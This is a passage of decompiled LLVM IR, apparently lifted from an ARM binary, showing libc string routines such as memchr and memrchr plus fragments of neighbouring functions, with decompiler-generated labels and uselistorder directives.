  store i32 %v1_14608, i32* %r5.global-to-local, align 4
  br i1 %v9_14604, label %dec_label_pc_14614, label %bb257

bb257:                                            ; preds = %dec_label_pc_145ec
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14634

dec_label_pc_14614:                               ; preds = %dec_label_pc_145ec
  %v0_14618.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_14614 = load i32, i32* %r6.global-to-local, align 4
  %v3_14614 = icmp ult i32 %v1_14608, %v1_14614
  %v9_14614 = icmp eq i32 %v1_14608, %v1_14614
  store i1 %v9_14614, i1* %cpsr_z.global-to-local, align 1
  %v2_14618 = add i32 %v0_14618.pre, %v3_14600
  store i32 %v2_14618, i32* %r7.global-to-local, align 4
  br i1 %v3_14614, label %dec_label_pc_145ec, label %dec_label_pc_14634

dec_label_pc_1462c:                               ; preds = %.thread21, %bb239
  %v0_1462c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1462c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1432c

dec_label_pc_14634:                               ; preds = %dec_label_pc_14614, %bb257
  %v0_14634 = phi i32 [ -1, %bb257 ], [ %v2_14618, %dec_label_pc_14614 ]
  store i32 %v0_14634, i32* %r0.global-to-local, align 4
  store i32 %v27_13e70, i32* @lr, align 4
  ret i32 %v0_14634

; uselistorder directives
  uselistorder i32 %v0_14634, { 1, 0 }
  uselistorder i32 %v1_14614, { 1, 0 }
  uselistorder i32 %v1_14608, { 0, 1, 3, 2 }
  uselistorder i32 %v0_145ec, { 2, 1, 0 }
  uselistorder i32 %v3_1458c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14554, { 0, 1, 3, 2 }
  uselistorder i32 %v4_14548, { 1, 2, 0 }
  uselistorder i32 %v0_14548, { 1, 0 }
  uselistorder i32 %v1_14550.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_14508, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_14504, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_144c8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_14490, { 1, 0 }
  uselistorder i32 %v1_14490, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1448c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_143ec, { 2, 1, 0 }
  uselistorder i32 %v2_1436c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_1435c, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_14348, { 1, 0, 2 }
  uselistorder i32 %v5_14344, { 0, 2, 1, 3 }
  uselistorder i32 %v1_143d430, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_142fc, { 1, 0 }
  uselistorder i32 %v1_142f4, { 1, 2, 0 }
  uselistorder i32 %v2_142e8, { 1, 0 }
  uselistorder i32 %v1_142e8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_142e8, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_142b8, { 1, 0 }
  uselistorder i32 %v0_142b8, { 0, 2, 1 }
  uselistorder i32 %v2_142b4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_142a0, { 1, 0 }
  uselistorder i1 %v2_14290, { 1, 0 }
  uselistorder i32 %v1_1428c, { 3, 2, 1, 0 }
  uselistorder i32 %v2_14288, { 1, 0 }
  uselistorder i1 %v2_14278, { 1, 0 }
  uselistorder i32 %v1_1426c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_14220, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14220, { 1, 0, 2 }
  uselistorder i1 %v2_14208, { 1, 0 }
  uselistorder i32 %v5_141f0, { 1, 0 }
  uselistorder i32 %v0_141dc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_141c4, { 1, 2, 0 }
  uselistorder i32 %v2_141c0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14158, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14100, { 1, 0 }
  uselistorder double %v2_140c4, { 1, 0 }
  uselistorder i64 %v3_140c0, { 1, 0 }
  uselistorder i32 %v0_14080, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v2_140b0, { 1, 3, 0, 2 }
  uselistorder i32 %v0_14044, { 1, 0 }
  uselistorder i32 %v5_14000, { 1, 0 }
  uselistorder i32 %v1_13f20.v0_13f0c5, { 1, 0 }
  uselistorder i32 %v3_13fdc, { 1, 0 }
  uselistorder i32 %v0_13fb8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13fa0, { 2, 1, 0 }
  uselistorder i32 %v0_13f84, { 1, 0 }
  uselistorder i32 %v0_13ea4, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 14, 17, 15, 16, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 26, 28, 42, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 40, 41, 63, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 66, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 14, 16, 12, 17, 15, 18, 19, 36, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 0, 9, 10, 33, 37, 36, 34, 11, 12, 35, 13, 14, 38, 16, 15, 2, 17, 18, 4, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 61, 19, 20, 21, 22, 23, 24, 25, 26, 60, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i8 48, { 4, 6, 7, 8, 9, 0, 10, 1, 11, 2, 3, 12, 5 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 1, 2, 11, 13, 14, 3, 15, 10, 4, 5, 9, 16, 12, 7, 8, 20, 19, 0, 6, 17, 21, 18 }
  uselistorder i32 17, { 1, 2, 0, 3 }
  uselistorder i32 48, { 24, 5, 25, 26, 2, 6, 27, 7, 28, 8, 29, 39, 30, 9, 36, 37, 31, 32, 33, 34, 0, 1, 10, 12, 11, 13, 38, 3, 14, 15, 17, 35, 16, 18, 19, 20, 21, 40, 41, 42, 22, 23, 4 }
  uselistorder i32 10, { 24, 6, 25, 7, 8, 9, 2, 30, 32, 33, 26, 27, 10, 28, 11, 37, 40, 41, 42, 23, 29, 13, 12, 3, 44, 43, 34, 14, 45, 15, 46, 16, 47, 48, 1, 38, 39, 31, 5, 0, 35, 36, 17, 49, 18, 4, 20, 21, 19, 22, 50 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 9, { 1, 8, 0, 9, 10, 2, 17, 18, 19, 11, 12, 13, 14, 22, 23, 3, 21, 20, 16, 6, 7, 4, 15, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34056), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34080), { 2, 1, 0 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 3, 0 }
  uselistorder i8 45, { 1, 4, 2, 5, 3, 0, 6, 7 }
  uselistorder i32 45, { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 97, { 1, 0, 7, 5, 6, 8, 2, 3, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_1462c, { 1, 0 }
  uselistorder label %dec_label_pc_145e4, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_14544, { 2, 0, 1 }
  uselistorder label %dec_label_pc_144bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1448c, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_14464, { 1, 0 }
  uselistorder label %dec_label_pc_14438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14414, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143e4, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1432c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1431c, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_14244, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14150, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_14100, { 2, 1, 0 }
  uselistorder label %dec_label_pc_140f8, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_13fdc, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_13ef8, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_14668 = urem i32 %arg1, 256
  %v0_14684.pr = load i32, i32* @r2, align 4
  %v2_1468415 = icmp eq i32 %v0_14684.pr, 0
  %v0_14698.pre = load i32, i32* @r0, align 4
  br i1 %v2_1468415, label %dec_label_pc_14694, label %dec_label_pc_1468c

dec_label_pc_14670:                               ; preds = %dec_label_pc_1468c
  %v1_14670 = inttoptr i32 %v0_14680 to i8*
  %v2_14670 = load i8, i8* %v1_14670, align 1
  %v3_14670 = zext i8 %v2_14670 to i32
  %v9_14674 = icmp eq i32 %v3_14670, %v1_14668
  br i1 %v9_14674, label %dec_label_pc_14744, label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %dec_label_pc_14670
  %v1_1467c = add i32 %v0_1467c, -1
  %v1_14680 = add i32 %v0_14680, 1
  %v2_14684 = icmp eq i32 %v1_1467c, 0
  br i1 %v2_14684, label %dec_label_pc_14694, label %dec_label_pc_1468c

dec_label_pc_1468c:                               ; preds = %entry, %dec_label_pc_1467c
  %v0_1467c = phi i32 [ %v1_1467c, %dec_label_pc_1467c ], [ %v0_14684.pr, %entry ]
  %v0_14680 = phi i32 [ %v1_14680, %dec_label_pc_1467c ], [ %v0_14698.pre, %entry ]
  %v1_1468c = urem i32 %v0_14680, 4
  %v2_1468c = icmp eq i32 %v1_1468c, 0
  br i1 %v2_1468c, label %dec_label_pc_14694, label %dec_label_pc_14670

dec_label_pc_14694:                               ; preds = %dec_label_pc_1467c, %dec_label_pc_1468c, %entry
  %v0_1471022 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1467c ], [ %v0_1467c, %dec_label_pc_1468c ]
  %v0_14698 = phi i32 [ %v0_14698.pre, %entry ], [ %v1_14680, %dec_label_pc_1467c ], [ %v0_14680, %dec_label_pc_1468c ]
  %v4_14694 = mul nuw nsw i32 %v1_14668, 256
  %v5_14694 = or i32 %v4_14694, %v1_14668
  %v4_1469c = mul i32 %v5_14694, 65536
  %v5_1469c = or i32 %v4_1469c, %v5_14694
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1471022, 3
  br i1 %tmp, label %dec_label_pc_146a4, label %dec_label_pc_14738.preheader

dec_label_pc_146a4:                               ; preds = %dec_label_pc_14694, %dec_label_pc_14710.backedge
  %v0_146c060 = phi i32 [ %v1_146c0, %dec_label_pc_14710.backedge ], [ %v0_1471022, %dec_label_pc_14694 ]
  %v0_146e459 = phi i32 [ %v4_146a4, %dec_label_pc_14710.backedge ], [ %v0_14698, %dec_label_pc_14694 ]
  %v1_146a4 = inttoptr i32 %v0_146e459 to i32*
  %v2_146a4 = load i32, i32* %v1_146a4, align 4
  %v4_146a4 = add i32 %v0_146e459, 4
  %v2_146a8 = xor i32 %v2_146a4, %v5_1469c
  %v2_146ac = add i32 %v2_146a8, 2130640639
  %v1_146b0 = sub i32 -1, %v2_146a8
  %v2_146b4 = xor i32 %v2_146ac, %v1_146b0
  %v2_146b8 = and i32 %v2_146b4, -2130640640
  %v2_146bc = icmp eq i32 %v2_146b8, 0
  %v1_146c0 = add i32 %v0_146c060, -4
  br i1 %v2_146bc, label %dec_label_pc_14710.backedge, label %dec_label_pc_146c8

dec_label_pc_14710.backedge:                      ; preds = %dec_label_pc_146a4, %dec_label_pc_14700
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_146c0, 3
  br i1 %tmp73, label %dec_label_pc_146a4, label %dec_label_pc_14738.preheader

dec_label_pc_146c8:                               ; preds = %dec_label_pc_146a4
  %v2_146c8 = inttoptr i32 %v0_146e459 to i8*
  %v3_146c8 = load i8, i8* %v2_146c8, align 1
  %v4_146c8 = zext i8 %v3_146c8 to i32
  %v9_146d0 = icmp eq i32 %v4_146c8, %v1_14668
  %v1_146d4 = add i32 %v0_146e459, 3
  store i32 %v1_146d4, i32* @ip, align 4
  br i1 %v9_146d0, label %dec_label_pc_14744, label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146c8
  %v1_146dc = add i32 %v0_146e459, 1
  %v2_146dc = inttoptr i32 %v1_146dc to i8*
  %v3_146dc = load i8, i8* %v2_146dc, align 1
  %v4_146dc = zext i8 %v3_146dc to i32
  %v9_146e0 = icmp eq i32 %v4_146dc, %v1_14668
  br i1 %v9_146e0, label %bb, label %dec_label_pc_146f0

bb:                                               ; preds = %dec_label_pc_146dc
  br label %dec_label_pc_14744

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146dc
  %v1_146f0 = add i32 %v0_146e459, 2
  %v2_146f0 = inttoptr i32 %v1_146f0 to i8*
  %v3_146f0 = load i8, i8* %v2_146f0, align 1
  %v4_146f0 = zext i8 %v3_146f0 to i32
  %v9_146f4 = icmp eq i32 %v4_146f0, %v1_14668
  br i1 %v9_146f4, label %dec_label_pc_14744, label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %dec_label_pc_146f0
  %v2_14700 = inttoptr i32 %v1_146d4 to i8*
  %v3_14700 = load i8, i8* %v2_14700, align 1
  %v4_14700 = zext i8 %v3_14700 to i32
  %v9_14704 = icmp eq i32 %v4_14700, %v1_14668
  br i1 %v9_14704, label %bb36, label %dec_label_pc_14710.backedge

bb36:                                             ; preds = %dec_label_pc_14700
  br label %dec_label_pc_14744

dec_label_pc_14738.preheader:                     ; preds = %dec_label_pc_14710.backedge, %dec_label_pc_14694
  %v0_146e4.lcssa = phi i32 [ %v0_14698, %dec_label_pc_14694 ], [ %v4_146a4, %dec_label_pc_14710.backedge ]
  %v0_146c0.lcssa = phi i32 [ %v0_1471022, %dec_label_pc_14694 ], [ %v1_146c0, %dec_label_pc_14710.backedge ]
  %v2_147387 = icmp eq i32 %v0_146c0.lcssa, 0
  br i1 %v2_147387, label %dec_label_pc_14740, label %dec_label_pc_14728

dec_label_pc_14728:                               ; preds = %dec_label_pc_14734, %dec_label_pc_14738.preheader
  %v0_14738.in = phi i32 [ %v0_14738, %dec_label_pc_14734 ], [ %v0_146c0.lcssa, %dec_label_pc_14738.preheader ]
  %v0_14734 = phi i32 [ %v1_14734, %dec_label_pc_14734 ], [ %v0_146e4.lcssa, %dec_label_pc_14738.preheader ]
  %v0_14738 = add i32 %v0_14738.in, -1
  %v1_14728 = inttoptr i32 %v0_14734 to i8*
  %v2_14728 = load i8, i8* %v1_14728, align 1
  %v3_14728 = zext i8 %v2_14728 to i32
  %v9_1472c = icmp eq i32 %v3_14728, %v1_14668
  br i1 %v9_1472c, label %dec_label_pc_14744, label %dec_label_pc_14734

dec_label_pc_14734:                               ; preds = %dec_label_pc_14728
  %v1_14734 = add i32 %v0_14734, 1
  %v2_14738 = icmp eq i32 %v0_14738, 0
  br i1 %v2_14738, label %dec_label_pc_14740, label %dec_label_pc_14728

dec_label_pc_14740:                               ; preds = %dec_label_pc_14734, %dec_label_pc_14738.preheader
  br label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_14670, %dec_label_pc_146f0, %dec_label_pc_146c8, %dec_label_pc_14728, %bb36, %bb, %dec_label_pc_14740
  %v1_14748 = phi i32 [ 0, %dec_label_pc_14740 ], [ %v1_146dc, %bb ], [ %v1_146d4, %bb36 ], [ %v0_14734, %dec_label_pc_14728 ], [ %v1_146f0, %dec_label_pc_146f0 ], [ %v0_146e459, %dec_label_pc_146c8 ], [ %v0_14680, %dec_label_pc_14670 ]
  ret i32 %v1_14748

; uselistorder directives
  uselistorder i32 %v1_146c0, { 1, 0, 2 }
  uselistorder i32 %v0_146e459, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14694, { 1, 0 }
  uselistorder i32 %v0_1471022, { 1, 2, 0 }
  uselistorder i32 %v0_14680, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_14698.pre, { 1, 0 }
  uselistorder i32 %v1_14668, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_14744, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_14710.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_146a4, { 1, 0 }
  uselistorder label %dec_label_pc_14694, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1468c, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_14758 = urem i32 %arg2, 256
  %v2_1475c = add i32 %arg3, %arg1
  %v2_147744 = icmp eq i32 %arg3, 0
  br i1 %v2_147744, label %dec_label_pc_14784, label %dec_label_pc_1477c

dec_label_pc_14764:                               ; preds = %dec_label_pc_1477c
  %v1_14764 = add i32 %v0_14764, -1
  %v2_14764 = inttoptr i32 %v1_14764 to i8*
  %v3_14764 = load i8, i8* %v2_14764, align 1
  %v4_14764 = zext i8 %v3_14764 to i32
  %v9_14768 = icmp eq i32 %v4_14764, %v1_14758
  br i1 %v9_14768, label %dec_label_pc_14824, label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %dec_label_pc_14764
  %v1_14770 = add i32 %v0_14770, -1
  %v2_14774 = icmp eq i32 %v1_14770, 0
  br i1 %v2_14774, label %dec_label_pc_14784, label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %entry, %dec_label_pc_14770
  %v0_14770 = phi i32 [ %v1_14770, %dec_label_pc_14770 ], [ %arg3, %entry ]
  %v0_14764 = phi i32 [ %v1_14764, %dec_label_pc_14770 ], [ %v2_1475c, %entry ]
  %v1_1477c = urem i32 %v0_14764, 4
  %v2_1477c = icmp eq i32 %v1_1477c, 0
  br i1 %v2_1477c, label %dec_label_pc_14784, label %dec_label_pc_14764

dec_label_pc_14784:                               ; preds = %dec_label_pc_14770, %dec_label_pc_1477c, %entry
  %v0_1480c13 = phi i32 [ %v2_1475c, %entry ], [ %v1_14764, %dec_label_pc_14770 ], [ %v0_14764, %dec_label_pc_1477c ]
  %v0_147f89 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14770 ], [ %v0_14770, %dec_label_pc_1477c ]
  %v4_14784 = mul nuw nsw i32 %v1_14758, 256
  %v5_14784 = or i32 %v4_14784, %v1_14758
  %v4_14788 = mul i32 %v5_14784, 65536
  %v5_14788 = or i32 %v4_14788, %v5_14784
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_147f89, 3
  br i1 %tmp, label %dec_label_pc_14790, label %dec_label_pc_14818

dec_label_pc_14790:                               ; preds = %dec_label_pc_14784, %dec_label_pc_147f8.backedge
  %v0_147ac40 = phi i32 [ %v1_147ac, %dec_label_pc_147f8.backedge ], [ %v0_147f89, %dec_label_pc_14784 ]
  %v0_1479039 = phi i32 [ %v1_14790, %dec_label_pc_147f8.backedge ], [ %v0_1480c13, %dec_label_pc_14784 ]
  %v1_14790 = add i32 %v0_1479039, -4
  %v2_14790 = inttoptr i32 %v1_14790 to i32*
  %v3_14790 = load i32, i32* %v2_14790, align 4
  %v2_14794 = xor i32 %v3_14790, %v5_14788
  %v2_14798 = add i32 %v2_14794, 2130640639
  store i32 %v2_14798, i32* @ip, align 4
  %v1_1479c = sub i32 -1, %v2_14794
  %v2_147a0 = xor i32 %v2_14798, %v1_1479c
  %v2_147a4 = and i32 %v2_147a0, -2130640640
  %v2_147a8 = icmp eq i32 %v2_147a4, 0
  %v1_147ac = add i32 %v0_147ac40, -4
  br i1 %v2_147a8, label %dec_label_pc_147f8.backedge, label %dec_label_pc_147b4

dec_label_pc_147f8.backedge:                      ; preds = %dec_label_pc_14790, %dec_label_pc_147ec
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_147ac, 3
  br i1 %tmp46, label %dec_label_pc_14790, label %dec_label_pc_14818

dec_label_pc_147b4:                               ; preds = %dec_label_pc_14790
  %v1_147b4 = add i32 %v0_1479039, -1
  %v2_147b4 = inttoptr i32 %v1_147b4 to i8*
  %v3_147b4 = load i8, i8* %v2_147b4, align 1
  %v4_147b4 = zext i8 %v3_147b4 to i32
  %v9_147b8 = icmp eq i32 %v4_147b4, %v1_14758
  br i1 %v9_147b8, label %dec_label_pc_147e4, label %dec_label_pc_147c4

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147b4
  %v1_147c4 = add i32 %v0_1479039, -2
  %v2_147c4 = inttoptr i32 %v1_147c4 to i8*
  %v3_147c4 = load i8, i8* %v2_147c4, align 1
  %v4_147c4 = zext i8 %v3_147c4 to i32
  %v9_147c8 = icmp eq i32 %v4_147c4, %v1_14758
  br i1 %v9_147c8, label %dec_label_pc_147e4, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c4
  %v1_147d4 = add i32 %v0_1479039, -3
  %v2_147d4 = inttoptr i32 %v1_147d4 to i8*
  %v3_147d4 = load i8, i8* %v2_147d4, align 1
  %v4_147d4 = zext i8 %v3_147d4 to i32
  %v9_147d8 = icmp eq i32 %v4_147d4, %v1_14758
  br i1 %v9_147d8, label %dec_label_pc_147e4, label %dec_label_pc_147ec

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147d4, %dec_label_pc_147c4, %dec_label_pc_147b4
  %v0_147e4 = phi i32 [ %v1_147d4, %dec_label_pc_147d4 ], [ %v1_147c4, %dec_label_pc_147c4 ], [ %v1_147b4, %dec_label_pc_147b4 ]
  br label %dec_label_pc_14824

dec_label_pc_147ec:                               ; preds = %dec_label_pc_147d4
  %v1_147ec = inttoptr i32 %v1_14790 to i8*
  %v2_147ec = load i8, i8* %v1_147ec, align 1
  %v3_147ec = zext i8 %v2_147ec to i32
  %v9_147f0 = icmp eq i32 %v3_147ec, %v1_14758
  br i1 %v9_147f0, label %dec_label_pc_14824, label %dec_label_pc_147f8.backedge

dec_label_pc_1480c:                               ; preds = %dec_label_pc_14818
  %v1_14818 = add i32 %v0_14818, -1
  %v1_1480c = add i32 %v0_1480c, -1
  %v2_1480c = inttoptr i32 %v1_1480c to i8*
  %v3_1480c = load i8, i8* %v2_1480c, align 1
  %v4_1480c = zext i8 %v3_1480c to i32
  %v9_14810 = icmp eq i32 %v4_1480c, %v1_14758
  br i1 %v9_14810, label %dec_label_pc_14824, label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_14784, %dec_label_pc_147f8.backedge, %dec_label_pc_1480c
  %v0_1480c = phi i32 [ %v1_1480c, %dec_label_pc_1480c ], [ %v0_1480c13, %dec_label_pc_14784 ], [ %v1_14790, %dec_label_pc_147f8.backedge ]
  %v0_14818 = phi i32 [ %v1_14818, %dec_label_pc_1480c ], [ %v0_147f89, %dec_label_pc_14784 ], [ %v1_147ac, %dec_label_pc_147f8.backedge ]
  %v2_14818 = icmp eq i32 %v0_14818, 0
  br i1 %v2_14818, label %dec_label_pc_14820, label %dec_label_pc_1480c

dec_label_pc_14820:                               ; preds = %dec_label_pc_14818
  br label %dec_label_pc_14824

dec_label_pc_14824:                               ; preds = %dec_label_pc_14764, %dec_label_pc_147ec, %dec_label_pc_1480c, %dec_label_pc_147e4, %dec_label_pc_14820
  %v1_14828 = phi i32 [ %v0_147e4, %dec_label_pc_147e4 ], [ 0, %dec_label_pc_14820 ], [ %v1_1480c, %dec_label_pc_1480c ], [ %v1_14790, %dec_label_pc_147ec ], [ %v1_14764, %dec_label_pc_14764 ]
  ret i32 %v1_14828

; uselistorder directives
  uselistorder i32 %v0_14818, { 1, 0 }
  uselistorder i32 %v1_147ac, { 1, 0, 2 }
  uselistorder i32 %v1_14790, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1479039, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14784, { 1, 0 }
  uselistorder i32 %v0_147f89, { 1, 2, 0 }
  uselistorder i32 %v0_14764, { 1, 0, 2 }
  uselistorder i32 %v2_1475c, { 1, 0 }
  uselistorder i32 %v1_14758, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 -3, { 0, 2, 1, 3, 4 }
  uselistorder i32 -2130640640, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 0, 7, 3, 1, 4, 8, 9, 5, 10 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14824, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_14818, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14790, { 1, 0 }
  uselistorder label %dec_label_pc_14784, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1477c, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %dec_label_pc_1487c, %entry
  %v1_148948 = phi i32 [ %v1_148949, %dec_label_pc_1487c ], [ 0, %entry ]
